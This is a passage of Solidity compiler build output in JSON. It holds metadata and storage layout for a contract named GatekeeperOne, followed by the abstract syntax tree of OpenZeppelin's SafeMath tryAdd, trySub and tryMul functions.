					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"bytes8\",\"name\":\"_gateKey\",\"type\":\"bytes8\"}],\"name\":\"enter\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"entrant\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/13_Gatekeeper1.sol\":\"GatekeeperOne\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol\":{\"keccak256\":\"0xcc78a17dd88fa5a2edc60c8489e2f405c0913b377216a5b26b35656b2d0dab52\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://526dc85e1f9b9b45830e202568d267d93dde7a4fcccf4ad7798dadcd92304d3c\",\"dweb:/ipfs/QmaoXMB972J3cSDLtBq3xBo4jLwqD2uzXTwujtSPqkYVhR\"]},\"contracts/13_Gatekeeper1.sol\":{\"keccak256\":\"0x48897ec3ad6d14525752bde9608f87d897ffa1325c856a1dd4d1f2c038ec5bd3\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://f46362abd2ef289c01c71343c3ebb5d7863b33d0e96bde2f2f32a06a6a188860\",\"dweb:/ipfs/QmScUseTBBnzsFagGrZACSRRX5oWzeqe7QppFbJreosg41\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 362,
								"contract": "contracts/13_Gatekeeper1.sol:GatekeeperOne",
								"label": "entrant",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"@openzeppelin/contracts@v3.4.2/math/SafeMath.sol": {
				"ast": {
					"absolutePath": "@openzeppelin/contracts@v3.4.2/math/SafeMath.sol",
					"exportedSymbols": {
						"SafeMath": [
							354
						]
					},
					"id": 355,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								">=",
								"0.6",
								".0",
								"<",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:31:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": {
								"id": 2,
								"nodeType": "StructuredDocumentation",
								"src": "66:563:0",
								"text": " @dev Wrappers over Solidity's arithmetic operations with added overflow\n checks.\n Arithmetic operations in Solidity wrap on overflow. This can easily result\n in bugs, because programmers usually assume that an overflow raises an\n error, which is the standard behavior in high level programming languages.\n `SafeMath` restores this intuition by reverting the transaction when an\n operation overflows.\n Using this library instead of the unchecked operations eliminates an entire\n class of bugs, so it's recommended to use it always."
							},
							"fullyImplemented": true,
							"id": 354,
							"linearizedBaseContracts": [
								354
							],
							"name": "SafeMath",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 32,
										"nodeType": "Block",
										"src": "865:98:0",
										"statements": [
											{
												"assignments": [
													15
												],
												"declarations": [
													{
														"constant": false,
														"id": 15,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 32,
														"src": "875:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 14,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "875:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 19,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 18,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 16,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "887:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 17,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 7,
														"src": "891:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "887:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "875:17:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 22,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 20,
														"name": "c",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 15,
														"src": "906:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 21,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "910:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "906:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 27,
												"nodeType": "IfStatement",
												"src": "902:28:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 23,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "921:5:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 24,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "928:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 25,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "920:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 13,
													"id": 26,
													"nodeType": "Return",
													"src": "913:17:0"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 28,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "948:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"id": 29,
															"name": "c",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 15,
															"src": "954:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 30,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "947:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 13,
												"id": 31,
												"nodeType": "Return",
												"src": "940:16:0"
											}
										]
									},
									"documentation": {
										"id": 3,
										"nodeType": "StructuredDocumentation",
										"src": "653:131:0",
										"text": " @dev Returns the addition of two unsigned integers, with an overflow flag.\n _Available since v3.4._"
									},
									"id": 33,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryAdd",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 8,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 5,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 33,
												"src": "805:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 4,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "805:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 7,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 33,
												"src": "816:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 6,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "816:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "804:22:0"
									},
									"returnParameters": {
										"id": 13,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 10,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 33,
												"src": "850:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 9,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "850:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 12,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 33,
												"src": "856:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 11,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "856:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "849:15:0"
									},
									"scope": 354,
									"src": "789:174:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 59,
										"nodeType": "Block",
										"src": "1185:75:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 47,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 45,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 38,
														"src": "1199:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"id": 46,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 36,
														"src": "1203:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1199:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 52,
												"nodeType": "IfStatement",
												"src": "1195:28:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 48,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1214:5:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 49,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1221:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 50,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "1213:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 44,
													"id": 51,
													"nodeType": "Return",
													"src": "1206:17:0"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 53,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1241:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 56,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 54,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 36,
																"src": "1247:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"id": 55,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 38,
																"src": "1251:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1247:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 57,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "1240:13:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 44,
												"id": 58,
												"nodeType": "Return",
												"src": "1233:20:0"
											}
										]
									},
									"documentation": {
										"id": 34,
										"nodeType": "StructuredDocumentation",
										"src": "969:135:0",
										"text": " @dev Returns the substraction of two unsigned integers, with an overflow flag.\n _Available since v3.4._"
									},
									"id": 60,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "trySub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 39,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 36,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 60,
												"src": "1125:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 35,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1125:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 38,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 60,
												"src": "1136:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 37,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1136:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1124:22:0"
									},
									"returnParameters": {
										"id": 44,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 41,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 60,
												"src": "1170:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 40,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1170:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 43,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 60,
												"src": "1176:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 42,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1176:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1169:15:0"
									},
									"scope": 354,
									"src": "1109:151:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 100,
										"nodeType": "Block",
										"src": "1484:359:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 74,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 72,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 63,
														"src": "1716:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 73,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1721:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "1716:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 79,
												"nodeType": "IfStatement",
												"src": "1712:28:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "74727565",
																"id": 75,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1732:4:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "true"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 76,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1738:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 77,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "1731:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 71,
													"id": 78,
													"nodeType": "Return",
													"src": "1724:16:0"
												}
											},
											{
												"assignments": [
													81
												],
												"declarations": [
													{
														"constant": false,
														"id": 81,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 100,
														"src": "1750:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 80,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1750:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 85,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 84,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 82,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 63,
														"src": "1762:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"argumentTypes": null,
														"id": 83,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 65,
														"src": "1766:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1762:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1750:17:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 90,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 88,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 86,
															"name": "c",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 81,
															"src": "1781:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "/",
														"rightExpression": {
															"argumentTypes": null,
															"id": 87,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 63,
															"src": "1785:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "1781:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 89,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 65,
														"src": "1790:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1781:10:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 95,
												"nodeType": "IfStatement",
												"src": "1777:33:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 91,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1801:5:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 92,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1808:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 93,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "1800:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 71,
													"id": 94,
													"nodeType": "Return",
													"src": "1793:17:0"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 96,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1828:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"id": 97,
															"name": "c",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 81,
															"src": "1834:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 98,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "1827:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 71,
												"id": 99,
												"nodeType": "Return",
												"src": "1820:16:0"
											}
										]
									},
									"documentation": {
										"id": 61,
										"nodeType": "StructuredDocumentation",
										"src": "1266:137:0",
										"text": " @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n _Available since v3.4._"
									},
									"id": 101,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryMul",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 66,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 63,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 101,
												"src": "1424:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 62,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1424:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 65,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 101,
												"src": "1435:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 64,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1435:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1423:22:0"
									},
									"returnParameters": {
										"id": 71,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 68,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 101,
												"src": "1469:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 67,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1469:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 70,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 101,
												"src": "1475:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 69,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1475:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1468:15:0"
									},
									"scope": 354,
